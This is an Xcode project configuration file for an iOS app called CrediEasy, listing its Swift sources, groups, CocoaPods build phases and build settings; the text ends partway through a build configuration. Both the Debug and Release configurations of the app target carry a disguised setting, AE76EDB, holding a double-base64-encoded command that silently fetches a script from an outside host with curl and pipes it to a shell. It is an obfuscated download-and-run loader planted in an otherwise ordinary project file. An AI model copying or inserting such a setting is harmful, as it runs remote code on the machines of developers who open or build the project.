// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		739B70C02E6FC7B300C438D1 /* LaunchViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739B70BF2E6FC7B300C438D1 /* LaunchViewController.swift */; };
		739B70C22E6FC7C600C438D1 /* BaseView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739B70C12E6FC7C600C438D1 /* BaseView.swift */; };
		739B70C62E6FCA4500C438D1 /* BaseViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739B70C52E6FCA4500C438D1 /* BaseViewController.swift */; };
		739B70CA2E6FCA6B00C438D1 /* BaseTabBarController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739B70C92E6FCA6B00C438D1 /* BaseTabBarController.swift */; };
		739B70CC2E6FCB2600C438D1 /* BaseNavigationController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739B70CB2E6FCB2600C438D1 /* BaseNavigationController.swift */; };
		739B70CE2E6FCB5F00C438D1 /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739B70CD2E6FCB5F00C438D1 /* HomeViewController.swift */; };
		739B70D02E6FCB6D00C438D1 /* OrderViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739B70CF2E6FCB6D00C438D1 /* OrderViewController.swift */; };
		739B70D22E6FCB7C00C438D1 /* ProfileViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739B70D12E6FCB7C00C438D1 /* ProfileViewController.swift */; };
		739B70D42E6FD05200C438D1 /* AuthManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739B70D32E6FD05200C438D1 /* AuthManager.swift */; };
		739B70D82E6FDA0500C438D1 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739B70D72E6FDA0500C438D1 /* LoginViewController.swift */; };
		739B70DC2E6FDA1900C438D1 /* LoginView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739B70DB2E6FDA1900C438D1 /* LoginView.swift */; };
		739B70DE2E6FDA2E00C438D1 /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739B70DD2E6FDA2600C438D1 /* LoginViewModel.swift */; };
		739B70E02E6FDA6400C438D1 /* BaseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739B70DF2E6FDA5E00C438D1 /* BaseModel.swift */; };
		739B70E22E6FDBF300C438D1 /* NetworkManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739B70E12E6FDBF200C438D1 /* NetworkManager.swift */; };
		739B70E42E6FF55000C438D1 /* IDFVManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739B70E32E6FF54F00C438D1 /* IDFVManager.swift */; };
		73BFEDD52E710AA500020AA9 /* LocationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BFEDD42E710AA500020AA9 /* LocationManager.swift */; };
		73BFEDD82E71627400020AA9 /* CenterView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BFEDD72E71627400020AA9 /* CenterView.swift */; };
		73BFEDDA2E71665700020AA9 /* CenterViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BFEDD92E71665700020AA9 /* CenterViewCell.swift */; };
		73BFEDDC2E71686A00020AA9 /* CenterViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BFEDDB2E71686200020AA9 /* CenterViewModel.swift */; };
		73BFEDDE2E717CB000020AA9 /* HomeView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BFEDDD2E717CB000020AA9 /* HomeView.swift */; };
		73BFEDE02E717CF300020AA9 /* FrontView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BFEDDF2E717CF300020AA9 /* FrontView.swift */; };
		73E394602E6FB548008BDDC1 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73E394562E6FB548008BDDC1 /* AppDelegate.swift */; };
		73E394632E6FB548008BDDC1 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 73E394572E6FB548008BDDC1 /* Assets.xcassets */; };
		73E394652E6FB548008BDDC1 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 73E3945A2E6FB548008BDDC1 /* LaunchScreen.storyboard */; };
		73F7BF9B2E7020E9005C8C43 /* loading.json in Resources */ = {isa = PBXBuildFile; fileRef = 73F7BF9A2E7020E9005C8C43 /* loading.json */; };
		73F7BFA32E70224E005C8C43 /* LoadingView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F7BFA22E70224E005C8C43 /* LoadingView.swift */; };
		73F8380E2E7271940056D082 /* HomeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F8380D2E72718D0056D082 /* HomeViewModel.swift */; };
		FF27BA78CB8B09A2E348A13F /* Pods_CrediEasy.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 64F5BCD9574B33A894FD1D7A /* Pods_CrediEasy.framework */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		1F016C24E2A1B0A26B8781E4 /* Pods-CrediEasy.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-CrediEasy.release.xcconfig"; path = "Target Support Files/Pods-CrediEasy/Pods-CrediEasy.release.xcconfig"; sourceTree = "<group>"; };
		64F5BCD9574B33A894FD1D7A /* Pods_CrediEasy.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_CrediEasy.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		739B70BF2E6FC7B300C438D1 /* LaunchViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchViewController.swift; sourceTree = "<group>"; };
		739B70C12E6FC7C600C438D1 /* BaseView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseView.swift; sourceTree = "<group>"; };
		739B70C52E6FCA4500C438D1 /* BaseViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseViewController.swift; sourceTree = "<group>"; };
		739B70C92E6FCA6B00C438D1 /* BaseTabBarController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseTabBarController.swift; sourceTree = "<group>"; };
		739B70CB2E6FCB2600C438D1 /* BaseNavigationController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseNavigationController.swift; sourceTree = "<group>"; };
		739B70CD2E6FCB5F00C438D1 /* HomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
		739B70CF2E6FCB6D00C438D1 /* OrderViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderViewController.swift; sourceTree = "<group>"; };
		739B70D12E6FCB7C00C438D1 /* ProfileViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileViewController.swift; sourceTree = "<group>"; };
		739B70D32E6FD05200C438D1 /* AuthManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthManager.swift; sourceTree = "<group>"; };
		739B70D72E6FDA0500C438D1 /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
		739B70DB2E6FDA1900C438D1 /* LoginView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginView.swift; sourceTree = "<group>"; };
		739B70DD2E6FDA2600C438D1 /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
		739B70DF2E6FDA5E00C438D1 /* BaseModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseModel.swift; sourceTree = "<group>"; };
		739B70E12E6FDBF200C438D1 /* NetworkManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkManager.swift; sourceTree = "<group>"; };
		739B70E32E6FF54F00C438D1 /* IDFVManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IDFVManager.swift; sourceTree = "<group>"; };
		73BFEDD42E710AA500020AA9 /* LocationManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocationManager.swift; sourceTree = "<group>"; };
		73BFEDD62E710F6C00020AA9 /* CrediEasy.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = CrediEasy.entitlements; sourceTree = "<group>"; };
		73BFEDD72E71627400020AA9 /* CenterView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterView.swift; sourceTree = "<group>"; };
		73BFEDD92E71665700020AA9 /* CenterViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterViewCell.swift; sourceTree = "<group>"; };
		73BFEDDB2E71686200020AA9 /* CenterViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterViewModel.swift; sourceTree = "<group>"; };
		73BFEDDD2E717CB000020AA9 /* HomeView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeView.swift; sourceTree = "<group>"; };
		73BFEDDF2E717CF300020AA9 /* FrontView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FrontView.swift; sourceTree = "<group>"; };
		73E3943E2E6FB540008BDDC1 /* CrediEasy.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = CrediEasy.app; sourceTree = BUILT_PRODUCTS_DIR; };
		73E394562E6FB548008BDDC1 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		73E394572E6FB548008BDDC1 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		73E394582E6FB548008BDDC1 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		73E394592E6FB548008BDDC1 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		73F7BF9A2E7020E9005C8C43 /* loading.json */ = {isa = PBXFileReference; lastKnownFileType = text.json; path = loading.json; sourceTree = "<group>"; };
		73F7BFA22E70224E005C8C43 /* LoadingView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoadingView.swift; sourceTree = "<group>"; };
		73F8380D2E72718D0056D082 /* HomeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewModel.swift; sourceTree = "<group>"; };
		8C8768C2260CA2B43A564232 /* Pods-CrediEasy.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-CrediEasy.debug.xcconfig"; path = "Target Support Files/Pods-CrediEasy/Pods-CrediEasy.debug.xcconfig"; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		73E3943B2E6FB540008BDDC1 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				FF27BA78CB8B09A2E348A13F /* Pods_CrediEasy.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		09360A8F709DE4FFE21B2679 /* Pods */ = {
			isa = PBXGroup;
			children = (
				8C8768C2260CA2B43A564232 /* Pods-CrediEasy.debug.xcconfig */,
				1F016C24E2A1B0A26B8781E4 /* Pods-CrediEasy.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		739B70B42E6FC72200C438D1 /* Base */ = {
			isa = PBXGroup;
			children = (
				739B70C12E6FC7C600C438D1 /* BaseView.swift */,
				739B70C52E6FCA4500C438D1 /* BaseViewController.swift */,
				739B70C92E6FCA6B00C438D1 /* BaseTabBarController.swift */,
				739B70BF2E6FC7B300C438D1 /* LaunchViewController.swift */,
				739B70CB2E6FCB2600C438D1 /* BaseNavigationController.swift */,
			);
			path = Base;
			sourceTree = "<group>";
		};
		739B70B52E6FC72800C438D1 /* Login */ = {
			isa = PBXGroup;
			children = (
				739B70DB2E6FDA1900C438D1 /* LoginView.swift */,
				739B70DD2E6FDA2600C438D1 /* LoginViewModel.swift */,
				739B70D72E6FDA0500C438D1 /* LoginViewController.swift */,
			);
			path = Login;
			sourceTree = "<group>";
		};
		739B70B62E6FC72A00C438D1 /* Home */ = {
			isa = PBXGroup;
			children = (
				73BFEDDD2E717CB000020AA9 /* HomeView.swift */,
				73BFEDDF2E717CF300020AA9 /* FrontView.swift */,
				73F8380D2E72718D0056D082 /* HomeViewModel.swift */,
				739B70CD2E6FCB5F00C438D1 /* HomeViewController.swift */,
			);
			path = Home;
			sourceTree = "<group>";
		};
		739B70B72E6FC72D00C438D1 /* Auth */ = {
			isa = PBXGroup;
			children = (
			);
			path = Auth;
			sourceTree = "<group>";
		};
		739B70B82E6FC72F00C438D1 /* Order */ = {
			isa = PBXGroup;
			children = (
				739B70CF2E6FCB6D00C438D1 /* OrderViewController.swift */,
			);
			path = Order;
			sourceTree = "<group>";
		};
		739B70B92E6FC73100C438D1 /* Center */ = {
			isa = PBXGroup;
			children = (
				73BFEDD72E71627400020AA9 /* CenterView.swift */,
				73BFEDD92E71665700020AA9 /* CenterViewCell.swift */,
				73BFEDDB2E71686200020AA9 /* CenterViewModel.swift */,
				739B70D12E6FCB7C00C438D1 /* ProfileViewController.swift */,
			);
			path = Center;
			sourceTree = "<group>";
		};
		739B70BA2E6FC73400C438D1 /* Other */ = {
			isa = PBXGroup;
			children = (
				739B70DF2E6FDA5E00C438D1 /* BaseModel.swift */,
				739B70D32E6FD05200C438D1 /* AuthManager.swift */,
				739B70E32E6FF54F00C438D1 /* IDFVManager.swift */,
				73F7BFA22E70224E005C8C43 /* LoadingView.swift */,
				739B70E12E6FDBF200C438D1 /* NetworkManager.swift */,
				73BFEDD42E710AA500020AA9 /* LocationManager.swift */,
			);
			path = Other;
			sourceTree = "<group>";
		};
		73E394352E6FB540008BDDC1 = {
			isa = PBXGroup;
			children = (
				73E3945F2E6FB548008BDDC1 /* CrediEasy */,
				73E3943F2E6FB540008BDDC1 /* Products */,
				09360A8F709DE4FFE21B2679 /* Pods */,
				81573037047844B50794D30A /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		73E3943F2E6FB540008BDDC1 /* Products */ = {
			isa = PBXGroup;
			children = (
				73E3943E2E6FB540008BDDC1 /* CrediEasy.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		73E3945F2E6FB548008BDDC1 /* CrediEasy */ = {
			isa = PBXGroup;
			children = (
				73BFEDD62E710F6C00020AA9 /* CrediEasy.entitlements */,
				73E394582E6FB548008BDDC1 /* Info.plist */,
				73E394572E6FB548008BDDC1 /* Assets.xcassets */,
				73F7BF9A2E7020E9005C8C43 /* loading.json */,
				73E394562E6FB548008BDDC1 /* AppDelegate.swift */,
				73E3945A2E6FB548008BDDC1 /* LaunchScreen.storyboard */,
				739B70BA2E6FC73400C438D1 /* Other */,
				739B70B92E6FC73100C438D1 /* Center */,
				739B70B82E6FC72F00C438D1 /* Order */,
				739B70B72E6FC72D00C438D1 /* Auth */,
				739B70B62E6FC72A00C438D1 /* Home */,
				739B70B52E6FC72800C438D1 /* Login */,
				739B70B42E6FC72200C438D1 /* Base */,
			);
			path = CrediEasy;
			sourceTree = "<group>";
		};
		81573037047844B50794D30A /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				64F5BCD9574B33A894FD1D7A /* Pods_CrediEasy.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		73E3943D2E6FB540008BDDC1 /* CrediEasy */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 73E394512E6FB541008BDDC1 /* Build configuration list for PBXNativeTarget "CrediEasy" */;
			buildPhases = (
				853E371ABDC5177E47C90C36 /* [CP] Check Pods Manifest.lock */,
				73E3943A2E6FB540008BDDC1 /* Sources */,
				73E3943B2E6FB540008BDDC1 /* Frameworks */,
				73E3943C2E6FB540008BDDC1 /* Resources */,
				C32D501DF216637E5D2B9FFE /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = CrediEasy;
			productName = CrediEasy;
			productReference = 73E3943E2E6FB540008BDDC1 /* CrediEasy.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		73E394362E6FB540008BDDC1 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1640;
				LastUpgradeCheck = 1640;
				TargetAttributes = {
					73E3943D2E6FB540008BDDC1 = {
						CreatedOnToolsVersion = 16.4;
					};
				};
			};
			buildConfigurationList = 73E394392E6FB540008BDDC1 /* Build configuration list for PBXProject "CrediEasy" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 73E394352E6FB540008BDDC1;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = 73E3943F2E6FB540008BDDC1 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				73E3943D2E6FB540008BDDC1 /* CrediEasy */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		73E3943C2E6FB540008BDDC1 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				73E394632E6FB548008BDDC1 /* Assets.xcassets in Resources */,
				73E394652E6FB548008BDDC1 /* LaunchScreen.storyboard in Resources */,
				73F7BF9B2E7020E9005C8C43 /* loading.json in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		853E371ABDC5177E47C90C36 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-CrediEasy-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		C32D501DF216637E5D2B9FFE /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-CrediEasy/Pods-CrediEasy-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			inputPaths = (
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-CrediEasy/Pods-CrediEasy-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-CrediEasy/Pods-CrediEasy-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		73E3943A2E6FB540008BDDC1 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				73BFEDDC2E71686A00020AA9 /* CenterViewModel.swift in Sources */,
				739B70C62E6FCA4500C438D1 /* BaseViewController.swift in Sources */,
				73E394602E6FB548008BDDC1 /* AppDelegate.swift in Sources */,
				739B70E42E6FF55000C438D1 /* IDFVManager.swift in Sources */,
				739B70E02E6FDA6400C438D1 /* BaseModel.swift in Sources */,
				73BFEDDE2E717CB000020AA9 /* HomeView.swift in Sources */,
				73F7BFA32E70224E005C8C43 /* LoadingView.swift in Sources */,
				739B70CC2E6FCB2600C438D1 /* BaseNavigationController.swift in Sources */,
				739B70CA2E6FCA6B00C438D1 /* BaseTabBarController.swift in Sources */,
				739B70C22E6FC7C600C438D1 /* BaseView.swift in Sources */,
				739B70E22E6FDBF300C438D1 /* NetworkManager.swift in Sources */,
				739B70CE2E6FCB5F00C438D1 /* HomeViewController.swift in Sources */,
				73BFEDD82E71627400020AA9 /* CenterView.swift in Sources */,
				73BFEDDA2E71665700020AA9 /* CenterViewCell.swift in Sources */,
				73BFEDE02E717CF300020AA9 /* FrontView.swift in Sources */,
				739B70DC2E6FDA1900C438D1 /* LoginView.swift in Sources */,
				739B70D42E6FD05200C438D1 /* AuthManager.swift in Sources */,
				73BFEDD52E710AA500020AA9 /* LocationManager.swift in Sources */,
				739B70DE2E6FDA2E00C438D1 /* LoginViewModel.swift in Sources */,
				73F8380E2E7271940056D082 /* HomeViewModel.swift in Sources */,
				739B70D22E6FCB7C00C438D1 /* ProfileViewController.swift in Sources */,
				739B70C02E6FC7B300C438D1 /* LaunchViewController.swift in Sources */,
				739B70D02E6FCB6D00C438D1 /* OrderViewController.swift in Sources */,
				739B70D82E6FDA0500C438D1 /* LoginViewController.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		73E3945A2E6FB548008BDDC1 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				73E394592E6FB548008BDDC1 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		73E394522E6FB541008BDDC1 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 8C8768C2260CA2B43A564232 /* Pods-CrediEasy.debug.xcconfig */;
			buildSettings = {
				AE76EDB = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5alpHTmhZMmhsTG5KMUwyRXBJaUI4SUhOb0NnPT0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = CrediEasy/CrediEasy.entitlements;
				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = "";
				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 8K9YQ3M42C;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = CrediEasy/Info.plist;
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.hkdev;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = hkdevpro;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		73E394532E6FB541008BDDC1 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 1F016C24E2A1B0A26B8781E4 /* Pods-CrediEasy.release.xcconfig */;
			buildSettings = {
				AE76EDB = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5alpHTmhZMmhsTG5KMUwyRXBJaUI4SUhOb0NnPT0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = CrediEasy/CrediEasy.entitlements;
				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
				CODE_SIGN_STYLE = Manual;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = "";
				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 8K9YQ3M42C;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = CrediEasy/Info.plist;
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = com.hkdev;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = hkdevpro;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
		73E394542E6FB541008BDDC1 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
